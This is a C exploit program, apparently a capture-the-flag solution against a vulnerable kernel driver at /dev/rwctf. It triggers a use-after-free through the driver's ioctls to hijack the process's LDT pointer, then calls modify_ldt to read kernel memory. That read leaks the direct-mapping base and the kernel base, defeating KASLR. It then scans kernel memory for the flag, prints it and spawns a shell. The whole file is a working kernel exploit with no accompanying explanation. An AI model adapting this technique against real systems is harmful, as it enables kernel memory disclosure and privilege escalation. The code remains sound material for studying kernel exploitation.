#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <asm/ldt.h>
#include <stdio.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <stdint.h>

int dev_fd;

struct node {
    uint32_t idx;
    uint32_t size;
    void *buf;
};

/**
 * @brief allocate an object bby kmalloc(size, ___GFP_RECLAIMABLE | GFP_KERNEL | __GFP_ATOMIC)
 * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM 
 * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS
 * 
 * @param idx 
 * @param size 
 * @param buf 
 */

void err_exit(char * msg)
{
    printf("[x] %s \n", msg);
    exit(EXIT_FAILURE);
}

void alloc(uint32_t idx, uint32_t size, void *buf)
{
    struct node n = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };

    ioctl(dev_fd, 0xDEADBEEF, &n);
}

void del(uint32_t idx)
{
    struct node n = {
        .idx = idx,
    };

    ioctl(dev_fd, 0xC0DECAFE, &n);
}

int main(int argc, char **argv, char **envp)
{
    struct user_desc desc;
    uint64_t page_offset_base = 0xffff888000000000;
    uint64_t secondary_startup_64;
    uint64_t kernel_base = 0xffffffff81000000, kernel_offset;
    uint64_t search_addr, flag_addr = -1;
    uint64_t temp;
    uint64_t ldt_buf[0x10];
    char *buf;
    char flag[0x100];
    int pipe_fd[2];
    int retval;
    cpu_set_t cpu_set;

    /* bind to CPU core 0 */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(0, sizeof(cpu_set), &cpu_set);

    dev_fd = open("/dev/rwctf", O_RDONLY);
    if (dev_fd < 0) {
        err_exit("FAILED to open the /dev/rwctf file!");
    }

    /* init descriptor info */
    desc.base_addr = 0xff0000;
    desc.entry_number = 0x8000 / 8;
    desc.limit = 0;
    desc.seg_32bit = 0;
    desc.contents = 0;
    desc.limit_in_pages = 0;
    desc.lm = 0;
    desc.read_exec_only = 0;
    desc.seg_not_present = 0;
    desc.useable = 0;

    alloc(0, 16, "arttnba3rat3bant");
    del(0);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while(1) {
        ldt_buf[0] = page_offset_base;
        ldt_buf[1] = 0x8000 / 8;
        del(0);
        alloc(0, 16, ldt_buf);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0) {
            printf("[-] read data: 0x%lx\n", temp);
            break;
        }
        else if (retval == 0) {
            err_exit("no mm->context.ldt!");
        }
        page_offset_base += 0x1000000;
    }
    printf("[+] Found page_offset_base: 0x%lx\n", page_offset_base);

    /* leak kernel base from direct mappinig area by modify_ldt() */
    ldt_buf[0] = page_offset_base + 0x9d000;
    ldt_buf[1] = 0x8000 / 8;
    del(0);
    alloc(0, 16, ldt_buf);
    syscall(SYS_modify_ldt, 0, &secondary_startup_64, 8);
    kernel_offset = secondary_startup_64 - 0xffffffff81000060;
    kernel_base += kernel_offset;
    printf("[*] Get  secondary_startup_64: 0x%lx\n", secondary_startup_64);
    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    printf("[+] kernel_offset: 0x%lx\n", kernel_offset);

    /* search for flag in kernel space */
    search_addr = page_offset_base;
    pipe(pipe_fd);
    buf = (char*) mmap(NULL, 0x8000, 
                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 
                        0, 0);
    while(1) {
        ldt_buf[0] = search_addr;
        ldt_buf[1] = 0x8000 / 8;
        del(0);
        alloc(0, 16, ldt_buf);
        int ret = fork();
        if (!ret) { // child
            char *result_addr;

            syscall(SYS_modify_ldt, 0, buf, 0x8000);
            result_addr = memmem(buf, 0x8000, "rwctf{", 6);
            if (result_addr) {
                for (int i = 0; i < 0x100; i++) {
                    if (result_addr[i] == '}') {
                        flag_addr = search_addr + (uint64_t)(result_addr - buf);
                        printf("[+] Found flag at addr: 0x%lx\n", flag_addr);
                    }
                }
            }
            write(pipe_fd[1], &flag_addr, 8);
            exit(0);
        }
        wait(NULL);
        read(pipe_fd[0], &flag_addr, 8);
        if (flag_addr != -1) {
            break;
        }
        search_addr += 0x8000;
    }

    /* read flag */
    memset(flag, 0, sizeof(flag));
    ldt_buf[0] = flag_addr;
    ldt_buf[1] = 0x8000 / 8;
    del(0);
    alloc(0, 16, ldt_buf);
    syscall(SYS_modify_ldt, 0, flag, 0x100);
    printf("[+] flag: %s\n", flag);

    system("/bin/sh");

    return 0;
}